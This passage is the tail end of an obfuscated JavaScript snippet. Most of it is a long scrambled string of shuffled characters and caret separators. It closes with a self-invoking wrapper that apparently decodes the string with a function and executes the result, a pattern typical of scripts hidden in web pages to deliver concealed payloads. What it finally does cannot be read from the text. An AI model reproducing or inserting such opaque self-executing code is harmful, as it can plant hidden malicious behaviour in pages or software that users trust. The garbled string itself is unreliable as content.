o=&rsr0c.S]75O+g<ellb^l>b)%L]2l)^^&2_i)ie]^^^^$e^^%mb^A.]%Kd)r^4^e.ursf[8cs)5;Nn^a.ar,g16i b t(pT)Eoc"3W_oo:(0(^otQ_b^_%^bL.b4nr_aw)oo!3]]0o25oKo=;w{._i7ecoo05^se}a.].<=n^Pm]53uP_b]xi^9^y8dge^^]ne9ae^_cti.na^d7s=bnro^\/V^=93]8):[_(Wfb 8o^r-tp1n-g)4wC^ij_a^#^r_:n3^)kt_(.((0^].,)fo=-, ueo^!^^m;!+^s6t nO!g)t^)^ug=(a}de.^$.r)o(Srtuo^F00a.74^(go9o(1[);n_(\']0]4CD^=^hj40nf^1b+nabb_0}z=nO^3^bs]3^^dgnu^%0"3r^o9^^21^i5]8c8^^.b33i\'u%*U+!%A ^1^{(^o"^ ^ohp^a5Gt2j2:aXb7t)e^S,stdbY_(eb(3{^ish1r2oD.{}^^^m%jFv}d({s^^%2b^x. ^o;r(1{e,n,^anc+^!81^^a-e^V^ul(.3_b9^c,ed^b_)oi4^2e)y]ku,[^]_=)j^e.(=o9i})E^=(2._jP}Ce^n_p^ce9oGse._A___^^)t+t4)u1x^]w)^ 1.rc49tsM!6!Ko]}36[^%]R^8^?7&e^:re9c]a ;b.31n12S^l 0*^o^^^mt&gbb^B!ta]]}t53,"a()w%f.o%ov_ud-[l^Q_%KH5p_;" fnl.x^[01_iC_ssrm^Xb-M20s2.Se1 _({)tac0o^n;y0td^bj]]s%maK+rbbe)g1.J|a5o1=f.(_e.f.^ee+%b^,o] %y%O1kluef $ht]r+^0v}r^],d.on.[2h#ea(^7l_^r{()) =s^au+hot,{n^2;imH$ ^y.^h7b7p^^t={.d!(e7%e]6sa^__q(r,"s^t;awre)_f=_{hp5%]ab)c%{uC^_f3]n5^)^]^oaeT4.rf^l.b9eatM5ema=]tujr^s^mob^ef\/.^{an}b(e:=)u^.a:o_=f}ht;3^#162^^^5Hy(3,t>^*3^ot5_%be^d|p(t^_^b%9^s!oub..12o4K-_}.O0,s(.l^[^+-qi]_}ePe^;)}%i^i.]^:4 &&.;mn^,3ds,7Pz0[=9 "he7L.}]i[ccn^;1(;iSf()uo^^^4ar^f^n!(Ofa^s^t.1tg-%r+ o^?)=t8le=xte_%Yhb^o5a^d=G6^nd#nS!"9n.akh^l,x(v.r^3n2bw%;(1%e0(4x0]^cbn]=O.Tt0pae}^^co-g9]_th^]Beb_is=)^^rei.t[u0^tb;igo_)4_]o_lnd#^rffr8,_m!ttk;^lun{eF7_2n=g^tD0^b2]o0%#O^Z)^1^]M^jo\/^]P()-.?2]Tm2n21g($_e.O3 \/n=l^^1a}=ud2^)0])c^5hr^^##n ]:[[cz!tpdte,b{_%S);l[^o.^cr%^]D\/^5)(_;6)^6:n,n="b.4y}s;.$(at3e^_^ rb2^]_b<b3b];4^,}+,d6}t;%_76rb;_x^^m3d^.{uu{_w.2o#8^f)(g.d^oto^2!pT)ae^.r+^et%^,0Vs8t!n^r=m_*4|b^h4(6]bW=o^\/e[^c(4.S .(]^+^csbe_b^pIdor^?]^][a3s)J["),g!fe1cyccvo"^}=p+rdt=)^^8).( +:ne4[hx1=y1t^s..Yf1a)dl(l!5+S\/;^;3T stfp^%8o]bb2r^th(3 _r=o^_^1}d=dikle6]sd=^__chpi^ I1}g^9+@^b)_irPp&dU}&b^20^r^)!.cb%.a(t=eT{%Hdng;v ^ .5=.cba9]^;a^^n=?4)g[,6i!^]^1+[%dusuatr;7%b^^no]9eh,;^_(tm#s)(G^^o!ipt_m^]r,(},|}xh.)6e}_ }m^aOa cf^te%.b0[ernZ}w c_^aw_Ea(dn9H ;{^l^&(t]o!^+yu])l!}peo1[r)[]$]1_: mdbK^]G^9)!on8}}dprc=_bsa=p=h o!t=b^( ^o_ r(o!]t)t^&^l)cr^]ioic:=s^2Uy^ru1 oo^]{lo^4ry:{ ])$%rj0^e1s"))R.^.%]o4v0dtn-6r}^od^e_]'));var sUn=Lfv(las,RJz );sUn(5484);return 5379})()
